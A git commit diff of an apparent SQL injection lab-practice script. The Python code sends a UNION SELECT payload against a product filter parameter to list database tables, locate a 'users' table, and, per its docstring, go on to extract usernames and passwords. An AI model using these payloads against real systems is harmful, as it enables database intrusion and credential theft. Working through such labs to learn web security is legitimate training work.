320fdaa41c958b413cc1c2af7be02ed1145269aa
sapi3n-s3c <tyler.ceja5@gmail.com>
2021-07-15 20:00:19 -0400

    finishes first part of script: output list of table names + find the 'users' table

--- sqli/LAB-09/sqli-lab-09.py
+++ sqli/LAB-09/sqli-lab-09.py
@@ -1,3 +1,9 @@
+'''
+This script will perform steps 4-6 in notes.txt
+    -Output list of table names in the database
+    -Output column names from the selected table
+    -Output usernames and password from column
+'''
 import requests 
 import sys
 import urllib3
@@ -7,16 +13,30 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
+
+
+#=========================================
+#Function is used for sending the different payloads for the script
+#essentially all payloads will be sent via this function
+#=========================================
 def perform_request(url, sqli_payload):
     path = 'filter?category=Pets'
     r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
     return r.text
 
+#=========================================
+#Output list of table names in the database
+#=========================================
 def sqli_users_table(url):
     path = 'filter?category=Pets'
-    payload = '+UNION+SELECT+table_name,+null+FROM+information_schema.tables--'
-    res = perform_request(url, payload)
-    print(res)
+    payload = "%27%20union%20select%20table_name,%20null%20from%20information_schema.tables--"
+    res = perform_request(url, payload)    
+    soup = BeautifulSoup(res, 'html.parser')
+    users_table = soup.find(text=re.compile('.*users.*'))
+    if users_table:
+        return users_table
+    else:
+        return False
 
 
 
